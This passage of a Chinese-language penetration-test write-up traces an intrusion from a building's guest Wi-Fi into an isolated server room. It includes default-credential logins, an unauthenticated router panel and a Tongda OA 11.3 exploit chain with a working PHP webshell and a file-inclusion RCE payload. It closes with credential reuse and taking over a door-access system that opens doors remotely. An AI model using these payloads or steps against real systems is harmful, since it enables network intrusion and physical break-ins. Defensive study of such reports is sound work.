print('=========================================================
=================\n')
wifi.disconnect_wifi()
幸运的是，这里我通过一段时间的等待，终于拿到了GUEST的连接
密码。
这里连接上GUEST后，我与目标的距离终于是更近了一步，但是GUE
ST所在的网络显然只是连入了互联网，我们想要得到更多的结果还
是要拿下刚才的Tech才行，一般企业无线架构中，这些AP会有自己
的管理页面，通过探测相应的web端口，我发现了一个路由管理网页
。
接下来就是通过万能的搜索引擎，寻找相应的配置文档，看看是否
有相应的默认账户及口令。
幸运的是，我通过文档中的默认账号及密码，成功登入了相应的WEB
界面。
接下来我通过Device来查看接入设备的地址，看看是不是有新的可
以达到的网络地址进行进一步的测试。
我们可以看到在172.16.*.*有部分设备接入，那么这些网段中除
了连入的员工使用的设备，还会存在什么呢？在回答这个问题之前
， 先 说 个 题 外 话 ， 在 测 试 过 程 中 ， 我 发 现 Rucks
7341竟然存在着一个命令执行的漏洞 : )。
无线软路由未授权访问
我们从上面已经得到了172.16.*.* 的新的网段，接下来我又对这
个区段进行了WEB端口的存活性探测，发现了一个路由管理界面。
这里尝试弱口令以及爆破都没有得到相应的结果，但是目前我们资
产收集也没有新的收获，只能寄希望于这里能存在一些可以利用的
漏洞了，经过不断的测试以及配置文档的搜索，我发现这里存在着
未授权访问的漏洞，通过直接访问/webfig地址就可以直接进入系
统面板而无需进行登录，由此，我们顺利的绕过了登录验证的过程
。
这里提示是一共有4个Interface，这里我注意到了一个新的VLAN
，对应的name是office，并且我通过ARP看到了他所在的IP区段是
172.16.200.*
但是通过测试，我目前所在的GUEST网段与172.16.200.*是无法
连通的，所以想要进一步探测office里面有什么，就要想办法让自
己连接过去，于是我继续看看这个路由都有什么功能，看看是不是
可以有新的发现。
TechWIFI
在看到Hotspot时，存在以下界面。
点击相应的user会进入如下界面。
这里由于对设备不是很熟悉，不太清楚账号和密码是什么意思，只
能大致推断，上面我们发现的Interface一共有如下四项。
 lan
 net
 office
 wan
这里的profile对应写的是net，那会不会我们用这个账号密码连
接Tech热点时就可以访问net相应的区段呢？因为我对office更感
兴趣，因此我找到了一个profile是office的账号密码进行了登录
测试，成功通过了Tech的验证，并且成功与172.16.200.*网段连
通。
通达OA
经过对172.16.200.*的测试，找到了一个OA系统，版本为通达OA
11.3
该版本不仅存在任意用户登录的问题，还存在一个任意文件上传可
以导致RCE的漏洞，我们首先本地分析一下这个漏洞，下载好源码先
用Zend解密工具解密一下源码，首先看ispirit/im/upload.php
源码中的auth.php是用来检验登录验证的源码。
我们可以看到代码第5行有一个判断语句，如果POST请求中P非空的
情况下，代码会将session设置成P参数的值，否则就会对session
中的LOGIN_USER_ID以及LOGIN_UID进行验证，检验失败则会提
示用户未登陆并退出，所以我们可以构造P参数就可以绕过登录验证
，那么我们利用这里就可以在未登录的情况下直接进行文件上传，
正常情况下我们访问upload.php
当我们构造$P之后。
这里我们就已经绕过了身份检验的过程，接下来就是构造文件上传
，我们接着看下面的代码。
其中的POST参数中的DEST_UID也会进行校验，值如果不是整型的
话就会提示接收方ID无效，我们构造DEST_UID再试一次。
接下来我们构造相应的文件上传即可，接着向下看到文件上传的变
量名是ATTACHMENT，我们看到52行调用了upload函数。
相关代码在inc\utility_file.php，进行了后缀名的限制。
我们接下来构造文件上传。
上传成功，这里虽然可以通过php.的方法上传php文件，但是上传
之后文件位置为attach目录下，并不在根目录，而且文件前被自动
加上了随机数，我们无法得知相应的文件名，因此无法直接利用。
我们再接着向下看，
120行输出的databack里面有CONTENT，而这个变量包含了文件名
，所以我们直接POST即可对UPLOAD_MODE和MSG_CATE赋值，通过
UPLOAD_MODE为1的方法就可以解决文件名的问题，我们需要解决
文件目录的问题了，这里无法通过../进行路径穿越，所以我们需要
寻找一下文件包含的点，接下来我们来看ispirit\interface\ga
teway.php
其中url参数中含有general/、ispirit/、module/之一，那么
就include_once变量url中的值，即可包含任意文件，分析完成后
，我们开始进行利用，首先编写我们中途利用到的木马1.jpg
exec("cmd.exe /c ".$_POST['cmd']."");
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
再构造如下界面进行上传。
然后将我们的木马上传上去。
得到了我们相应的文件位置attach/im/2011/820599126.1.jpg
，之后利用gateway.php进行文件包含，并利用如下语句进行RCE
json={"url":"/general/../../attach/im/2011/820599126.1.jpg"}&cmd
=dir
而且权限是system
之后就是常规操作，拿下服务器。
门禁系统
在拿下OA服务器这个小倒霉蛋之后，就是常规内网扫了一下整个B段
开启3389的机器，然后用刚才抓取的密码进行了碰撞，尝试是否有
密码复用的情况，在碰撞过程中，扫到了一台门禁系统的服务器，
并且成功用域账户进行了登录，由于前面扫描资产存活的时候，为
了速度，脚本里面只添加了几个常用的80、443这些端口，这个808
8端口提供服务的门禁系统也就成了漏网之鱼，在服务器上看到这个
系统之后，首先还是进行了访问，登录界面还是需要账户密码验证
，但是这里我已经登上服务器了还怕没有密码？从配置文件中找到
系统的数据库连接密码后连接数据库，直接查看了admin账户对应
的密码。
登录到系统上一看，是一个门禁系统。
这里为什么要提一下这个门禁系统呢，因为这个门禁系统不仅可以
实时监控各个考勤机的状态，甚至还能远程开关门。
至此，我已经能随意在这座大厦的任何一个房间自由出入了。
靶标
因为文章刚开始也说了，这次的靶标是物理隔离的，因此我必须找
到相应机房的交换机，然后把自己的设备用网线连接上去，之后才
能继续测试，在上面拿下门禁系统后，我已经可以自由的打开相应
服务器所在机房的大门，也是终于从访客WIFI终于肉身接触到靶标
所在的服务器了，插好网线，配好IP，我已经是可以直通靶标的一
员了。
但是由于是目标最核心系统，因此是不仅WEB端需要账号密码认证，
还需要有动态密码才能进行登录，因此放弃了直接通过WEB端开始入
手的想法，测试了好久也没什么进展。
正在我一筹莫展的时候，我转念一想，在这种核心物理隔离，又不
与外网连通的地方，入侵者入侵起来麻烦，运维师傅维护起来估计
也不容易，想必也不经常打补丁，先探测探测整个C段的端口，看看
有没有能直接利用的主机漏洞或者其他端口上的WEB服务来曲线救国
的。
扫描结束后，我惊奇的发现我们的靶标，竟然开放了445端口。
这幸福来的也太突然了。
至此，我的从访客网络到潜入机房的行动彻底收工！
参考文档
1. https://mp.weixin.qq.com/s/dmXYxqFWGFl3ZnXOwZ-nlQ
2. https://wenku.baidu.com/view/52b236f8f705cc175527
096f.html
精选留言
用户设置不下载评论